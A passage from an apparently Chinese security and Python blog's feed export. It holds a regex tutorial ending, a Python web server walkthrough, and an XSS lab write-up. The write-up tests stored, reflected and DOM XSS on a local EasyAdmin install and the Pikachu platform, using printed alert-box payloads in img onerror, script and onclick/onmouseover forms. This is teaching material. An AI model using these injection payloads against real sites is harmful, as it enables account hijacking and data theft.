class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:&lt;re.Match object; span=(7, 10), match=&apos;997&apos;&gt;Out:&apos;python=998&apos;</code></pre><ul><li>练习:从下面的字符串中取出文本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">&lt;p&gt;岗位职责： &lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;完成推荐算法、 数据统计、 接⼝、 后台等服务器端相关⼯作&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;必备要求： &lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;良好的⾃我驱动⼒和职业素养， ⼯作积极主动、 结果导向&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;技术要求： &lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;1、 ⼀年以上 Python 开发经验， 掌握⾯向对象分析和设计， 了解设计模式&lt;&#x2F;p</span><br><span class="line">&gt; &lt;</span><br><span class="line">p&gt;2、 掌握HTTP协议， 熟悉MVC、 MVVM等概念以及相关WEB开发框架&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;3、 掌握关系数据库开发设计， 掌握 SQL， 熟练使⽤ MySQL&#x2F;PostgreSQL 中</span><br><span class="line">的⼀种&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p&gt;4、 掌握NoSQL、 MQ， 熟练使⽤对应技术解决⽅案&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"""&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;岗位职责：&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&lt;br&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;必备要求： &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;良好的自我驱动力和职业素养， 工作积极主动、 结果导向&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;技术要求： &lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式&lt;/p&gt; </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">ret =re.sub(<span class="string">r"&lt;/?\w*&gt;"</span>,<span class="string">""</span>,s)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;\n岗位职责：\n完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作\n\n必备要求： \n良好的自我驱动力和职业素养， 工作积极主动、 结果导向\n&amp;nbsp;\n技术要求： \n1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式 \n&apos;</code></pre><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><blockquote><p>根据匹配进行切割字符串，并返回一个列表</p></blockquote><p>需求：切割字符串“info:dddd 33 shandong”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret =re.split(<span class="string">r":| "</span>,<span class="string">"info:dddd 33 shandong"</span>)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><pre><code>Out:[&apos;info&apos;, &apos;dddd&apos;, &apos;33&apos;, &apos;shandong&apos;]</code></pre><h2 id="0x09-Python贪婪和非贪婪"><a href="#0x09-Python贪婪和非贪婪" class="headerlink" title="0x09 Python贪婪和非贪婪"></a>0x09 Python贪婪和非贪婪</h2><p>Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符；</p><p>非贪婪相反，总是尝试匹配尽可能少的字符。</p><p>在<code>*</code>、<code>?</code>、<code>+</code>、<code>{m,n}</code>后面加上<code>？</code>，使贪婪变成非贪婪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"this is a number 234-235-22-423"</span></span><br><span class="line">r = re.match(<span class="string">".+(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line">r.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;4-235-22-423&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变为非贪婪</span></span><br><span class="line">r = re.match(<span class="string">".+?(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line">r.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;234-235-22-423&apos;</code></pre><ul><li><p>说明：<br>正则表达式模式中使用到通配字， 那它在从左到右的顺序求值时， 会尽量“抓取”满足匹配最长字符串， 在我们上面的例子里面， “.+”会从字符串的起始处抓取满足模式的最长字符， 其中包括我们想得到的第一个整型字段的中的大部分，“\d+”只需一位字符就可以匹配， 所以它匹配了数字“4”， 而“.+”则匹配了从字符串起始到这个第一位数字4之前的所有字符。</p></li><li><p>解决方式：非贪婪操作符“？”,这个操作符可以用在<code>*</code>、<code>?</code>、<code>+</code>、<code>{m,n}</code>后面，要求正则匹配的越少越好。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"aa(\d+)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;2343&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"aa(\d+?)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;2&apos;</code></pre><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><p>提取下面文本中图片链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;apple-touch-icon-precomposed&quot; href&#x3D;&quot;https:&#x2F;&#x2F;s.mozhe.cn&#x2F;static&#x2F;ico&#x2F;apple-touch-icon.png&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s= <span class="string">"""&lt;link rel="apple-touch-icon-precomposed" href="https://s.mozhe.cn/static/ico/apple-touch-icon.png"&gt; &lt;link rel="apple-touch-icon-precomposed" href="https://s.mozhe.cn/static/ico/apple-touch-icon.png"&gt;"""</span></span><br><span class="line">ret =re.search(<span class="string">r"https:.+?\.png"</span>,s)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;https://s.mozhe.cn/static/ico/apple-touch-icon.png&apos;</code></pre><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;dd&amp;rsv_spt&#x3D;1</span><br><span class="line">正则后变为：</span><br><span class="line">https:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s= <span class="string">"""https://www.baidu.com/s?wd=dd&amp;rsv_spt=1"""</span></span><br><span class="line">re.sub(<span class="string">r"https://.+?/"</span>, <span class="string">""</span>, s)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;s?wd=dd&amp;rsv_spt=1&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用匿名函数lambda作为处理函数</span></span><br><span class="line">re.sub(<span class="string">r"(https://.+?/).*"</span>,<span class="keyword">lambda</span> x: x.group(<span class="number">1</span>),s)</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;https://www.baidu.com/&apos;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.2 XSS（存储型-反射型-DOM型）实战</title>
      <link href="/2020/04/11/1.2%20XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B-%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM%E5%9E%8B%EF%BC%89%E5%AE%9E%E6%88%98/"/>
      <url>/2020/04/11/1.2%20XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B-%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM%E5%9E%8B%EF%BC%89%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h2><ul><li>存储型、反射型、DOM型造成XSS漏洞的简单原理、危害、攻击流程</li><li>利用EasyAdmin极简版的实战测试案例</li><li>几种XSS辅助测试工具</li></ul><a id="more"></a><h2 id="认识危害"><a href="#认识危害" class="headerlink" title="认识危害"></a>认识危害</h2><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss00.png" alt=""></p><h2 id="0x01-发现XSS"><a href="#0x01-发现XSS" class="headerlink" title="0x01 发现XSS"></a>0x01 发现XSS</h2><h3 id="1-1-XSS位置"><a href="#1-1-XSS位置" class="headerlink" title="1.1 XSS位置"></a>1.1 XSS位置</h3><ul><li>直接插入到SCRIPT标签里</li><li>插入到HTML注释里</li><li>插入到HTML标签的属性里</li><li>插入到HTML标签的名字</li><li>作为HTML标签的名字</li><li>直接插入到CSS里</li><li>……</li></ul><h3 id="1-2-手工发现"><a href="#1-2-手工发现" class="headerlink" title="1.2 手工发现"></a>1.2 手工发现</h3><ul><li><p>参数中提交XSS payload代码</p></li><li><p>在所有可以提交参数并能在页面返回的位置上</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li><li>搜索框</li><li>……</li></ul></li></ul><h3 id="1-3-常见业务场景"><a href="#1-3-常见业务场景" class="headerlink" title="1.3 常见业务场景"></a>1.3 常见业务场景</h3><ul><li>重灾区：评论区、留言区、个人信息、订单信息等</li><li>针对型：站内信、网页即时通讯、私信、意见反馈等</li><li>存在风险：搜索框、当前目录、图片属性等</li></ul><h2 id="实战环境配置"><a href="#实战环境配置" class="headerlink" title="实战环境配置"></a>实战环境配置</h2><ul><li><p>EasyAdmin极简版安装：[下载链接](链接：<a href="https://pan.baidu.com/s/1mEIcBSoFBBjN9DgIDzyxcg" target="_blank" rel="noopener">https://pan.baidu.com/s/1mEIcBSoFBBjN9DgIDzyxcg</a><br>提取码：qpzn)</p></li><li><p>下载后，本地windows+phpstudy，放置在WWW目录下</p></li><li><p>访问，之后创建数据库，即可完成配置</p></li></ul><h2 id="0x01-存储型XSS实战"><a href="#0x01-存储型XSS实战" class="headerlink" title="0x01 存储型XSS实战"></a>0x01 存储型XSS实战</h2><h3 id="1-1-存储型XSS攻击流程"><a href="#1-1-存储型XSS攻击流程" class="headerlink" title="1.1 存储型XSS攻击流程"></a>1.1 存储型XSS攻击流程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss01.png" alt=""></p><h3 id="1-2-利用easyadmin进行测试"><a href="#1-2-利用easyadmin进行测试" class="headerlink" title="1.2 利用easyadmin进行测试"></a>1.2 利用easyadmin进行测试</h3><ul><li><p>利用img标签，<code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code>进行测试存在漏洞的地方</p></li><li><p>经测试，发现在添加标签时，出现弹窗</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss02.png" alt=""></p><ul><li>发布后，当点击该帖子，即可弹窗</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss03.png" alt=""></p><ul><li>点击开发者工具，可发现对添加的图片标签进行解析了，但并未解析出来，故执行了onerror事件，弹窗</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss04.png" alt=""></p><h2 id="0x02-反射型XSS实战"><a href="#0x02-反射型XSS实战" class="headerlink" title="0x02 反射型XSS实战"></a>0x02 反射型XSS实战</h2><h3 id="2-1-反射型XSS攻击流程"><a href="#2-1-反射型XSS攻击流程" class="headerlink" title="2.1 反射型XSS攻击流程"></a>2.1 反射型XSS攻击流程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss05.png" alt=""></p><h3 id="2-2-利用easyadmin测试"><a href="#2-2-利用easyadmin测试" class="headerlink" title="2.2 利用easyadmin测试"></a>2.2 利用easyadmin测试</h3><blockquote><p>攻击者在URL中插入XSS代码，服务端将URL中的XSS代码输出到页面上，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击</p></blockquote><ul><li>寻址存在URL的输入点，测试搜索栏</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss06.png" alt=""></p><ul><li>闭合title，并测试弹窗</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss07.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss08.png" alt=""></p><ul><li>寻找其他输入点</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss09.png" alt=""></p><ul><li>尖括号闭合，测试<code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss10.png" alt=""></p><h2 id="0x03DOM型XSS实战"><a href="#0x03DOM型XSS实战" class="headerlink" title="0x03DOM型XSS实战"></a>0x03DOM型XSS实战</h2><h3 id="3-1-测试环境"><a href="#3-1-测试环境" class="headerlink" title="3.1 测试环境"></a>3.1 测试环境</h3><ul><li>ubuntu+docker+pikachu之xss平台</li></ul><h3 id="3-2-DOM型xss测试"><a href="#3-2-DOM型xss测试" class="headerlink" title="3.2 DOM型xss测试"></a>3.2 DOM型xss测试</h3><ul><li>DOM型xss-x初始化界面：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss11.png" alt=""></p><ul><li>步骤一：输入111，URL发生变化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss12.png" alt=""></p><ul><li>再点击新出现的，URL又发生变化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss13.png" alt=""></p><ul><li>步骤二：F12审查源码</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss14.png" alt=""></p><ul><li>步骤三：审查domxss()函数</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss15.png" alt=""></p><pre><code>分析：JS代码，定义了一个domxss函数，利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str，然后经过URL解码和字符串分隔，取出URL中的参数内容，再把 “+” 替换为 “ ”（空格），赋值给 xss最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中；跟前面的DOM型xss不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)</code></pre><ul><li>步骤四：构造payload：<code>#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss16.png" alt=""></p><ul><li>尝试payload：<code>#&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss17.png" alt=""></p><h2 id="0x04-XSS辅助测试工具"><a href="#0x04-XSS辅助测试工具" class="headerlink" title="0x04 XSS辅助测试工具"></a>0x04 XSS辅助测试工具</h2><h3 id="4-1-BeEF"><a href="#4-1-BeEF" class="headerlink" title="4.1 BeEF"></a>4.1 BeEF</h3><p><a href="http://beefproject.com" target="_blank" rel="noopener">http://beefproject.com</a></p><h3 id="4-2-XSS’OR"><a href="#4-2-XSS’OR" class="headerlink" title="4.2 XSS’OR"></a>4.2 XSS’OR</h3><p><a href="http://xssor.io" target="_blank" rel="noopener">http://xssor.io</a></p><h3 id="4-3-IE-Tester"><a href="#4-3-IE-Tester" class="headerlink" title="4.3 IE Tester"></a>4.3 IE Tester</h3><p><a href="https://www.my-debugbar.com/wiki/IETester/HomePage" target="_blank" rel="noopener">https://www.my-debugbar.com/wiki/IETester/HomePage</a></p><h3 id="等等……"><a href="#等等……" class="headerlink" title="等等…….."></a>等等……..</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://blog.nsfocus.net/xss-start-finish/#34" target="_blank" rel="noopener">http://blog.nsfocus.net/xss-start-finish/#34</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.6 python-Web服务器框架-实现</title>
      <link href="/2020/04/10/1.6%20python-Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A1%86%E6%9E%B6-%E5%AE%9E%E7%8E%B0/"/>
      <url>/2020/04/10/1.6%20python-Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A1%86%E6%9E%B6-%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：将Web框架和Web服务器结合实现简单的服务器，及相关python知识的了解</p><a id="more"></a><h3 id="0x01-服务器代码（MyWebServer-py）"><a href="#0x01-服务器代码（MyWebServer-py）" class="headerlink" title="0x01 服务器代码（MyWebServer.py）"></a>0x01 服务器代码（MyWebServer.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> MyWebFramework <span class="keyword">import</span> Application</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态文件根目录</span></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line">WSGI_PYTHON_DIR = <span class="string">"./wsgipython"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPServer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">""""""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, application)</span>:</span></span><br><span class="line">        <span class="string">"""构造函数， application指的是框架的app"""</span></span><br><span class="line">        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.app = application</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket.listen(<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, client_address = self.server_socket.accept()</span><br><span class="line">            <span class="comment"># print("[%s, %s]用户连接上了" % (client_address[0],client_address[1]))</span></span><br><span class="line">            print(<span class="string">"[%s, %s]用户连接上了"</span> % client_address)</span><br><span class="line">            handle_client_process = Process(target=self.handle_client, args=(client_socket,))</span><br><span class="line">            handle_client_process.start()</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_response</span><span class="params">(self, status, headers)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">         status = "200 OK"</span></span><br><span class="line"><span class="string">    headers = [</span></span><br><span class="line"><span class="string">        ("Content-Type", "text/plain")</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">    star</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        response_headers = <span class="string">"HTTP/1.1 "</span> + status + <span class="string">"\r\n"</span></span><br><span class="line">        <span class="keyword">for</span> header <span class="keyword">in</span> headers:</span><br><span class="line">            response_headers += <span class="string">"%s: %s\r\n"</span> % header</span><br><span class="line"></span><br><span class="line">        self.response_headers = response_headers</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(self, client_socket)</span>:</span></span><br><span class="line">        <span class="string">"""处理客户端请求"""</span></span><br><span class="line">        <span class="comment"># 获取客户端请求数据</span></span><br><span class="line">        request_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"request data:"</span>, request_data)</span><br><span class="line">        request_lines = request_data.splitlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">            print(line)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析请求报文</span></span><br><span class="line">        <span class="comment"># 'GET / HTTP/1.1'</span></span><br><span class="line">        request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 提取用户请求的文件名</span></span><br><span class="line">        print(<span class="string">"*"</span> * <span class="number">10</span>)</span><br><span class="line">        print(request_start_line.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">        file_name = re.match(<span class="string">r"\w+ +(/[^ ]*) "</span>, request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line">        method = re.match(<span class="string">r"(\w+) +/[^ ]* "</span>, request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        env = &#123;</span><br><span class="line">            <span class="string">"PATH_INFO"</span>: file_name,</span><br><span class="line">            <span class="string">"METHOD"</span>: method</span><br><span class="line">        &#125;</span><br><span class="line">        response_body = self.app(env, self.start_response)</span><br><span class="line"></span><br><span class="line">        response = self.response_headers + <span class="string">"\r\n"</span> + response_body</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向客户端返回响应数据</span></span><br><span class="line">        client_socket.send(bytes(response, <span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关闭客户端连接</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bind</span><span class="params">(self, port)</span>:</span></span><br><span class="line">        self.server_socket.bind((<span class="string">""</span>, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    sys.path.insert(<span class="number">1</span>, WSGI_PYTHON_DIR)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        sys.exit(<span class="string">"python MyWebServer.py Module:app"</span>)</span><br><span class="line">    <span class="comment"># python MyWebServer.py  MyWebFrameWork:app</span></span><br><span class="line">    module_name, app_name = sys.argv[<span class="number">1</span>].split(<span class="string">":"</span>)</span><br><span class="line">    <span class="comment"># module_name = "MyWebFrameWork"</span></span><br><span class="line">    <span class="comment"># app_name = "app"</span></span><br><span class="line">    m = __import__(module_name)</span><br><span class="line">    app = getattr(m, app_name)</span><br><span class="line">    http_server = HTTPServer(app)</span><br><span class="line">    <span class="comment"># http_server.set_port</span></span><br><span class="line">    http_server.bind(<span class="number">8000</span>)</span><br><span class="line">    http_server.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="1-1-sys-argv"><a href="#1-1-sys-argv" class="headerlink" title="1.1 sys.argv"></a>1.1 sys.argv</h4><ul><li><p><code>sys.argv[]</code></p><blockquote><p>一个从程序外部获取参数的桥梁,外部参数不唯一，所以sys.argv以列表形式存储参数；其第一个元素是程序本身，随后才依次是外部给予的参数</p></blockquote></li><li><p>简单测试</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本测试是在jupyter notebook中测试</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.argv</span><br></pre></td></tr></table></figure><pre><code>[&apos;c:\\users\\fishmouse\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py&apos;, &apos;-f&apos;, &apos;C:\\Users\\fishmouse\\AppData\\Roaming\\jupyter\\runtime\\kernel-049997d2-f810-4826-9743-6db3b4d2e9ea.json&apos;]</code></pre><ul><li>本地测试</li></ul><p>测试代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">b=sys.argv</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><ul><li><p>测试结果(第三个输出原因是在测试代码中打印了b[0])<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410python01.png" alt=""></p></li><li><p>Pycharm为当前程序添加（python MyWebServer.py）的参数</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410web01.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410web02.png" alt=""></p><h3 